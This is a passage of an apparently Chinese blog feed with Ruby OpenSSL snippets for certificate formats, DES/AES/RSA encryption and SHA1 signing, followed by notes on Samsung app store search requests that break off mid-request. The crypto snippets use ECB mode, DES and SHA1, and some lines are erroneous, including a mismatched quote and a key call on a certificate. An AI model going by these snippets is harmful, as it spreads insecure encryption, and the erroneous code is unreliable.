    <content type="html"><![CDATA[<h1 id="数字证书-Ruby"><a href="#数字证书-Ruby" class="headerlink" title="数字证书-Ruby"></a>数字证书-Ruby</h1><h2 id="证书格式"><a href="#证书格式" class="headerlink" title="证书格式"></a>证书格式</h2><h3 id="PEM"><a href="#PEM" class="headerlink" title="PEM"></a>PEM</h3><p>PEM格式通常用于数字证书认证机构，扩展名为.pem, .crt, .cer, 和 .key。内容为Base64编码的ASCII码文件。服务器认证证书，中级认证证书和私钥都可以储存为PEM格式。<br>DER格式与PEM不同之处在于其使用二进制而不是Base64编码的ASCII。扩展名为.der，但也经常使用.cer用作扩展名，所有类型的认证证书和私钥都可以存储为DER格式。<br><a id="more"></a><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">data = File.read(<span class="string">'cert.pem'</span>)</span><br><span class="line">cert = OpenSSL::X509::Certificate.new data</span><br><span class="line"></span><br><span class="line">puts cert.serial.to_s <span class="comment"># 证书ID</span></span><br><span class="line">puts cert.public_key.to_s <span class="comment"># 证书公钥</span></span><br><span class="line">puts cert.subject.to_s <span class="comment"># 证书主题</span></span><br><span class="line">puts cert.to_pem</span><br><span class="line">puts cert.to_der</span><br></pre></td></tr></table></figure></p><h3 id="PKCS-7"><a href="#PKCS-7" class="headerlink" title="PKCS#7"></a>PKCS#7</h3><p>PKCS#7格式通常以Base64的格式存储，扩展名为.p7b 或 .p7c。PKCS#7只能存储认证证书或证书路径中的证书，不能存储私钥。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">data = File.read(<span class="string">'cert.p7b'</span>)</span><br><span class="line">pkcs7 = OpenSSL::PKCS7.new data</span><br><span class="line">certs = pkcs7.certificates</span><br><span class="line"></span><br><span class="line">certs.each <span class="keyword">do</span> <span class="params">|cert|</span></span><br><span class="line">  puts cert.serial.to_s <span class="comment"># 证书ID</span></span><br><span class="line">  puts cert.public_key.to_s <span class="comment"># 证书公钥</span></span><br><span class="line">  puts cert.subject.to_s <span class="comment"># 证书主题</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="PKCS-12"><a href="#PKCS-12" class="headerlink" title="PKCS#12"></a>PKCS#12</h3><p>PKCS#12格式是以加密的二进制形式存储服务器认证证书，中级认证证书和私钥。扩展名为.pfx 和 .p12，PXF通常用于Windows中导入导出认证证书和私钥。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造PKCS#12证书</span></span><br><span class="line">cert = OpenSSL::X509::Certificate.new(File.read(<span class="string">'cert.pem'</span>))</span><br><span class="line">pkey = OpenSSL::PKey::RSA.new(<span class="number">2048</span>)</span><br><span class="line">pkcs12 = OpenSSL::PKCS12.create(password, <span class="literal">nil</span>, pkey, cert)</span><br><span class="line">File.open(<span class="string">'cert.pfx'</span>, <span class="string">'w'</span>) &#123; <span class="params">|f|</span> f &lt;&lt; pkcs12.to_der &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取PKCS#12证书</span></span><br><span class="line">data = File.read(<span class="string">'cert.pfx'</span>)</span><br><span class="line">pkcs12 = OpenSSL::PKCS12.new(data, password)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;数字证书-Ruby&quot;&gt;&lt;a href=&quot;#数字证书-Ruby&quot; class=&quot;headerlink&quot; title=&quot;数字证书-Ruby&quot;&gt;&lt;/a&gt;数字证书-Ruby&lt;/h1&gt;&lt;h2 id=&quot;证书格式&quot;&gt;&lt;a href=&quot;#证书格式&quot; class=&quot;headerlink&quot; title=&quot;证书格式&quot;&gt;&lt;/a&gt;证书格式&lt;/h2&gt;&lt;h3 id=&quot;PEM&quot;&gt;&lt;a href=&quot;#PEM&quot; class=&quot;headerlink&quot; title=&quot;PEM&quot;&gt;&lt;/a&gt;PEM&lt;/h3&gt;&lt;p&gt;PEM格式通常用于数字证书认证机构，扩展名为.pem, .crt, .cer, 和 .key。内容为Base64编码的ASCII码文件。服务器认证证书，中级认证证书和私钥都可以储存为PEM格式。&lt;br&gt;DER格式与PEM不同之处在于其使用二进制而不是Base64编码的ASCII。扩展名为.der，但也经常使用.cer用作扩展名，所有类型的认证证书和私钥都可以存储为DER格式。&lt;br&gt;
    
    </summary>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/categories/Ruby/"/>
    
    
      <category term="Ruby" scheme="http://jack0pan.github.io/tags/Ruby/"/>
    
  </entry>
  
  <entry>
    <title>密码算法-Ruby</title>
    <link href="http://jack0pan.github.io/2016/08/17/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95-Ruby/"/>
    <id>http://jack0pan.github.io/2016/08/17/密码算法-Ruby/</id>
    <published>2016-08-17T04:48:12.000Z</published>
    <updated>2016-09-17T04:50:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="密码算法-Ruby"><a href="#密码算法-Ruby" class="headerlink" title="密码算法-Ruby"></a>密码算法-Ruby</h1><p>本文只是对常用的一些密码算法做个汇总，方便在使用Ruby实现时查询。<br><a id="more"></a></p><h2 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h2><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">cipher = OpenSSL::Cipher.new(<span class="string">'DES-ECB'</span>)</span><br><span class="line">cipher.encrypt()</span><br><span class="line">cipher.key = KEY</span><br><span class="line">encrypted = cipher.update(plain) + cipher.final()</span><br><span class="line"></span><br><span class="line">cipher.decrypt()</span><br><span class="line">cipher.key = KEY</span><br><span class="line">decrypt_palin = cipher.update(encrypted) + cipher.final()</span><br></pre></td></tr></table></figure><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">cipher = OpenSSL::Cipher.new(<span class="string">'AES-128-ECB'</span>)</span><br><span class="line">cipher.encrypt()</span><br><span class="line">cipher.key = KEY</span><br><span class="line">encrypted = cipher.update(plain) + cipher.final()</span><br><span class="line"></span><br><span class="line">cipher.decrypt()</span><br><span class="line">cipher.key = KEY</span><br><span class="line">decrypt_palin = cipher.update(encrypted) + cipher.final()</span><br></pre></td></tr></table></figure><h2 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'base64'</span></span><br><span class="line"></span><br><span class="line">encrypt_cert = OpenSSL::X509::Certificate.new(File.read(<span class="string">'encrypt_cert_path'</span>))</span><br><span class="line">public_key = encrypt_cert.public_key</span><br><span class="line">c = Base64.strict_encode64(public_key.public_encrypt(m))</span><br><span class="line"></span><br><span class="line">key = encrypt_cert.key</span><br><span class="line">decrypt_m = key.private_decrypt(Base64.decode64(c))</span><br></pre></td></tr></table></figure><h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>RSA签名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'digest/sha1'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'base64'</span></span><br><span class="line"></span><br><span class="line">sign_cert = OpenSSL::PKCS12.new(File.read(sign_cert_path<span class="string">'), '</span>password<span class="string">')</span></span><br><span class="line"><span class="string">key = sign_cert.key</span></span><br><span class="line"><span class="string">digest = Digest::SHA1.hexdigest(data)</span></span><br><span class="line"><span class="string">sign = Base64.strict_encode64(key.sign('</span>sha1<span class="string">', digest))</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;密码算法-Ruby&quot;&gt;&lt;a href=&quot;#密码算法-Ruby&quot; class=&quot;headerlink&quot; title=&quot;密码算法-Ruby&quot;&gt;&lt;/a&gt;密码算法-Ruby&lt;/h1&gt;&lt;p&gt;本文只是对常用的一些密码算法做个汇总，方便在使用Ruby实现时查询。&lt;br&gt;
    
    </summary>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/categories/Ruby/"/>
    
    
      <category term="Ruby" scheme="http://jack0pan.github.io/tags/Ruby/"/>
    
  </entry>
  
  <entry>
    <title>三星应用商店接口</title>
    <link href="http://jack0pan.github.io/2016/08/06/%E4%B8%89%E6%98%9F%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97%E6%8E%A5%E5%8F%A3/"/>
    <id>http://jack0pan.github.io/2016/08/06/三星应用商店接口/</id>
    <published>2016-08-06T13:54:21.000Z</published>
    <updated>2016-09-18T13:56:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>三星应用商店的接口是<code>XML</code>格式，使用<code>POST</code>方式提交，有的使用<code>HTTP</code>，有的使用<code>HTTPS</code>。<br><a id="more"></a></p><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><h3 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h3><p>地址：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post http://cn-ms.samsungapps.com/ods.as</span><br></pre></td></tr></table></figure></p><p>内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">version2</span>=<span class="string">"3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">openApiVersion</span>=<span class="string">"21"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span> <span class="attr">mcc</span>=<span class="string">"460"</span> <span class="attr">mnc</span>=<span class="string">"00"</span> <span class="attr">csc</span>=<span class="string">"VZW"</span> <span class="attr">sdlVersion</span>=<span class="string">"2101"</span> <span class="attr">odcVersion</span>=<span class="string">"4.1.04-10"</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">filter</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">request</span> <span class="attr">name</span>=<span class="string">"searchProductListEx"</span> <span class="attr">id</span>=<span class="string">"2040"</span> <span class="attr">numParam</span>=<span class="string">"10"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"startNum"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imgHeight"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlInputMethod"</span>&gt;</span>iqry<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imgWidth"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"endNum"</span>&gt;</span>10<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"keyword"</span>&gt;</span>民航<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"contentType"</span>&gt;</span>all<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlDomainCode"</span>&gt;</span>sa<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlDeviceType"</span>&gt;</span>phone<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"alignOrder"</span>&gt;</span>bestMatch<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>响应：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">id</span>=<span class="string">"2040"</span> <span class="attr">name</span>=<span class="string">"searchProductListEx"</span> <span class="attr">returnCode</span>=<span class="string">"0"</span> <span class="attr">startNum</span>=<span class="string">"1"</span> <span class="attr">endNum</span>=<span class="string">"10"</span> <span class="attr">totalCount</span>=<span class="string">"13"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">errorString</span> <span class="attr">errorCode</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span> <span class="attr">numValue</span>=<span class="string">"35"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"keyword"</span>&gt;</span>民航<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"correctedKeyword"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryName"</span>&gt;</span>生活方式<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryID"</span>&gt;</span>G000013058<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productID"</span>&gt;</span>000000607315<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productName"</span>&gt;</span>航旅纵横<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productImgUrl"</span>&gt;</span>http://img.samsungapps.com/productNew/000000607315/IconImage_20160826132045350_NEW_WEB_ICON_135_135.png<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"currencyUnit"</span>&gt;</span>元<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"price"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountPrice"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountFlag"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"averageRating"</span>&gt;</span>9<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"date"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"contentType"</span>&gt;</span>application<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"tnbYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"GUID"</span>&gt;</span>com.umetrip.android.msky.app<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"version"</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"realContentSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"versionCode"</span>&gt;</span>109<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"installSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"srchClickURL"</span>&gt;</span>|@sn=SAPS|@qh=6b0d84489ac5bb5e9ec6c0332a43bfa0|@qid=SAPS.ODC.SRCH.CJK|@q=民航|@idx=0|@tot=13|@doc=000000607315test0astor00035|@title=航旅纵横<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"linkProductYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"restrictedAge"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"loadType"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"newProductYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellerName"</span>&gt;</span>China TravelSky Holding Company<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"giftsTagYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"panelImgUrl"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"edgeAppType"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bAppType"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bGearVersion"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"IAPSupportYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"capIdList"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"shortDescription"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>地址：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post http://cn-ms.samsungapps.com/ods.as</span><br></pre></td></tr></table></figure></p><p>内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">version2</span>=<span class="string">"3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">openApiVersion</span>=<span class="string">"21"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span> <span class="attr">mcc</span>=<span class="string">"460"</span> <span class="attr">mnc</span>=<span class="string">"00"</span> <span class="attr">csc</span>=<span class="string">"VZW"</span> <span class="attr">sdlVersion</span>=<span class="string">"2101"</span> <span class="attr">odcVersion</span>=<span class="string">"4.1.04-10"</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">filter</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">request</span> <span class="attr">name</span>=<span class="string">"searchProductListEx"</span> <span class="attr">id</span>=<span class="string">"2040"</span> <span class="attr">numParam</span>=<span class="string">"10"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"startNum"</span>&gt;</span>11<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imgHeight"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlInputMethod"</span>&gt;</span>more<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imgWidth"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"endNum"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"keyword"</span>&gt;</span>民航<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"contentType"</span>&gt;</span>all<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlDomainCode"</span>&gt;</span>sa<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlDeviceType"</span>&gt;</span>phone<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"alignOrder"</span>&gt;</span>bestMatch<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><h3 id="APP内容"><a href="#APP内容" class="headerlink" title="APP内容"></a>APP内容</h3><p>地址：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post https://cn-ms.samsungapps.com/ods.as</span><br></pre></td></tr></table></figure></p><p>内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">version2</span>=<span class="string">"3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> 